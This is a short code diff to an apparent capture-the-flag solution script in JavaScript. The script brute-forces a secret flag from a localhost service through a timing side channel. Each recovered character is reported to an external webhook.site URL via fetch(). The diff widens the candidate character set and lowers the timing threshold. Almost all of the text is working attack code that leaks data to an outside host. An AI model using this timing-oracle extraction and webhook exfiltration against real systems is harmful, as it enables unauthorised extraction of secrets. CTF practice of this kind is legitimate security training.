@@ -9,7 +9,7 @@
         const TARGET = 'http://localhost:3031'; 
         const REPORT_URL = 'https://webhook.site/c52095bc-72e6-4717-80a3-37bddf872811'; 
         let flag = "RS{"; 
-        const chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_}";
 
         function report(data) {
             fetch(`${REPORT_URL}?log=${encodeURIComponent(data)}`);
@@ -30,7 +30,7 @@
             for (let i = 0; i < 30; i++) {
                 for (let c of chars) {
                     const time = await check(flag + c);
-                    if (time > 5) { 
+                    if (time > 2) { 
                         flag += c;
                         report("찾은 글자: " + flag);
                         if (c === '}') return;
